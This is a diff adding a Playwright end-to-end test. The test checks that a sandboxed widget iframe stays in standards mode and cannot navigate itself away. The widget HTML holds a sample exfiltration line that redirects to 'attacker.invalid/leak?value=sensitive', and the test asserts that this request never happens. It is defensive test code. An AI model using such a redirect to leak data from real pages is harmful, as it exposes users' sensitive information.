@@ -2,6 +2,8 @@
 import { chromium, type Browser, type Page } from "playwright";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { GATEWAY_SERVER_CAPS } from "../../../packages/gateway-protocol/src/index.js";
+import { SANDBOX_HOST_PATH } from "../../../src/agents/sandbox-host.js";
+import { createSandboxHostHttpServer } from "../../../src/gateway/mcp-app-sandbox-http.js";
 import {
   canRunPlaywrightChromium,
   installMockGateway,
@@ -115,6 +117,93 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
   afterAll(async () => {
     await browser?.close();
     await server?.close();
+  });
+
+  it("keeps widget documents in standards mode and cancels self-navigation", async () => {
+    const sandboxHost = createSandboxHostHttpServer();
+    await new Promise<void>((resolve, reject) => {
+      sandboxHost.once("error", reject);
+      sandboxHost.listen(0, "127.0.0.1", () => {
+        sandboxHost.off("error", reject);
+        resolve();
+      });
+    });
+    const sandboxAddress = sandboxHost.address();
+    if (!sandboxAddress || typeof sandboxAddress === "string") {
+      throw new Error("sandbox host did not bind a TCP address");
+    }
+    const context = await browser.newContext();
+    try {
+      const page = await context.newPage();
+      const escapeRequests: string[] = [];
+      page.on("request", (request) => {
+        if (request.url().startsWith("https://attacker.invalid/")) {
+          escapeRequests.push(request.url());
+        }
+      });
+      await page.goto(server.baseUrl);
+      await page.evaluate((sandboxUrl) => {
+        Reflect.set(globalThis, "widgetProbes", []);
+        addEventListener("message", (event) => {
+          (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
+        });
+        const frame = document.createElement("iframe");
+        frame.src = sandboxUrl;
+        document.body.replaceChildren(frame);
+      }, `http://127.0.0.1:${sandboxAddress.port}${SANDBOX_HOST_PATH}`);
+      await expect
+        .poll(async () =>
+          page.evaluate(() =>
+            (Reflect.get(globalThis, "widgetProbes") as Array<{ method?: string }>).some(
+              (probe) => probe?.method === "ui/notifications/sandbox-proxy-ready",
+            ),
+          ),
+        )
+        .toBe(true);
+
+      const widgetHtml = `<!doctype html><html><body><script>
+        parent.postMessage({
+          compatMode: document.compatMode,
+        }, "*");
+        setTimeout(() => {
+          location.href = "https://attacker.invalid/leak?value=sensitive";
+        }, 0);
+      </script></body></html>`;
+      await page.locator("iframe").evaluate((frame, html) => {
+        (frame as HTMLIFrameElement).contentWindow?.postMessage(
+          {
+            method: "ui/notifications/sandbox-resource-ready",
+            params: { html },
+          },
+          "*",
+        );
+      }, widgetHtml);
+      await expect
+        .poll(async () =>
+          page.evaluate(() =>
+            (
+              Reflect.get(globalThis, "widgetProbes") as Array<{
+                compatMode?: string;
+              }>
+            ).filter((probe) => probe?.compatMode),
+          ),
+        )
+        .toEqual([{ compatMode: "CSS1Compat" }]);
+      const sandboxFrame = await page
+        .locator("iframe")
+        .elementHandle()
+        .then((handle) => handle?.contentFrame());
+      const widgetFrame = sandboxFrame?.childFrames()[0];
+      expect(widgetFrame).toBeDefined();
+      await page.waitForTimeout(250);
+      expect(widgetFrame!.url()).not.toContain("attacker.invalid");
+      expect(escapeRequests).toEqual([]);
+    } finally {
+      await context.close();
+      await new Promise<void>((resolve, reject) => {
+        sandboxHost.close((error) => (error ? reject(error) : resolve()));
+      });
+    }
   });
 
   it("pins Canvas HTML, follows board commands, and persists dock resizing", async () => {
